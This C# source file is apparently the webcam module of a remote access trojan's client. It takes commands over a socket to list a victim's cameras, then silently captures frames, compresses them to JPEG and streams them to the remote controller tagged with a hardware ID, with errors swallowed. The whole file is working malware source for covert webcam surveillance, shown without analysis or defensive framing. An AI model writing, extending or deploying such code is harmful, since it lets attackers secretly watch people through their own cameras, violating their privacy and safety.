using AForge.Video;
using AForge.Video.DirectShow;
using Client.Connection;
using Client.Helper;
using Client.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;

namespace Client.Handle_Packet
{
    public static class HandleWebcam
    {
        public static bool IsOn = false;
        public static VideoCaptureDevice FinalVideo;
        public static string HWID = Methods.HWID();
        private static MemoryStream Camstream = new MemoryStream();
        private static TempSocket TempSocket = null;
        private static int Quality = 50;

        public static void Run(MsgPack unpack_msgpack)
        {
            try
            {
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "webcam":
                        {
                            switch (unpack_msgpack.ForcePathObject("Command").AsString)
                            {
                                case "getWebcams":
                                    {
                                        TempSocket?.Dispose();
                                        TempSocket = new TempSocket();
                                        if (TempSocket.IsConnected)
                                        {
                                            GetWebcams();
                                        }
                                        else
                                        {
                                            new Thread(() =>
                                            {
                                                try
                                                {
                                                    TempSocket.Dispose();
                                                    CaptureDispose();
                                                }
                                                catch { }
                                            }).Start();
                                        }
                                        break;
                                    }

                                case "capture":
                                    {
                                        if (IsOn == true) return;
                                        if (TempSocket.IsConnected)
                                        {
                                            IsOn = true;
                                            FilterInfoCollection videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                                            FinalVideo = new VideoCaptureDevice(videoCaptureDevices[0].MonikerString);
                                            Quality = (int)unpack_msgpack.ForcePathObject("Quality").AsInteger;
                                            FinalVideo.NewFrame += CaptureRun;
                                            FinalVideo.VideoResolution = FinalVideo.VideoCapabilities[unpack_msgpack.ForcePathObject("List").AsInteger];
                                            FinalVideo.Start();
                                        }
                                        else
                                        {
                                            new Thread(() =>
                                            {
                                                try
                                                {
                                                    CaptureDispose();
                                                    TempSocket.Dispose();
                                                }
                                                catch { }
                                            }).Start();
                                        }
                                        break;
                                    }

                                case "stop":
                                    {
                                        new Thread(() =>
                                        {
                                            try
                                            {
                                                CaptureDispose();
                                            }
                                            catch { }
                                        }).Start();
                                        break;
                                    }
                            }
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Webcam switch" + ex.Message);
            }
        }

        private static void CaptureRun(object sender, NewFrameEventArgs e)
        {
            try
            {
                if (TempSocket.IsConnected)
                {
                    if (IsOn == true)
                    {
                        Bitmap image = (Bitmap)e.Frame.Clone();
                        using (Camstream = new MemoryStream())
                        {
                            System.Drawing.Imaging.Encoder myEncoder = System.Drawing.Imaging.Encoder.Quality;
                            EncoderParameters myEncoderParameters = new EncoderParameters(1);
                            EncoderParameter myEncoderParameter = new EncoderParameter(myEncoder, Quality);
                            myEncoderParameters.Param[0] = myEncoderParameter;
                            ImageCodecInfo jpgEncoder = Methods.GetEncoder(ImageFormat.Jpeg);
                            image.Save(Camstream, jpgEncoder, myEncoderParameters);
                            myEncoderParameters?.Dispose();
                            myEncoderParameter?.Dispose();
                            image?.Dispose();

                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "webcam";
                            msgpack.ForcePathObject("ID").AsString = HWID;
                            msgpack.ForcePathObject("Command").AsString = "capture";
                            msgpack.ForcePathObject("Image").SetAsBytes(Camstream.ToArray());
                            TempSocket.Send(msgpack.Encode2Bytes());
                            Thread.Sleep(1);
                        }
                    }
                }
                else
                {
                    new Thread(() =>
                    {
                        try
                        {
                            CaptureDispose();
                            TempSocket.Dispose();
                        }
                        catch { }
                    }).Start();
                }
            }
            catch (Exception ex)
            {
                new Thread(() =>
                {
                    try
                    {
                        CaptureDispose();
                        TempSocket.Dispose();
                    }
                    catch { }
                }).Start();
                Debug.WriteLine("CaptureRun: " + ex.Message);
            }
        }

        private static void GetWebcams()
        {
            try
            {
                StringBuilder deviceInfo = new StringBuilder();
                FilterInfoCollection videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                foreach (FilterInfo videoCaptureDevice in videoCaptureDevices)
                {
                    deviceInfo.Append(videoCaptureDevice.Name + "-=>");
                    VideoCaptureDevice device = new VideoCaptureDevice(videoCaptureDevice.MonikerString);
                    Debug.WriteLine(videoCaptureDevice.Name);
                }
                MsgPack msgpack = new MsgPack();
                if (deviceInfo.Length > 0)
                {
                    msgpack.ForcePathObject("Packet").AsString = "webcam";
                    msgpack.ForcePathObject("Command").AsString = "getWebcams";
                    msgpack.ForcePathObject("ID").AsString = HWID;
                    msgpack.ForcePathObject("List").AsString = deviceInfo.ToString();
                }
                else
                {
                    msgpack.ForcePathObject("Packet").AsString = "webcam";
                    msgpack.ForcePathObject("Command").AsString = "getWebcams";
                    msgpack.ForcePathObject("ID").AsString = HWID;
                    msgpack.ForcePathObject("List").AsString = "None";
                }
                TempSocket.Send(msgpack.Encode2Bytes());
            }
            catch { }
        }

        private static void CaptureDispose()
        {
            try
            {
                IsOn = false;
                FinalVideo.Stop();
                FinalVideo.NewFrame -= CaptureRun;
                Camstream?.Dispose();
            }
            catch { }
        }
    }
}
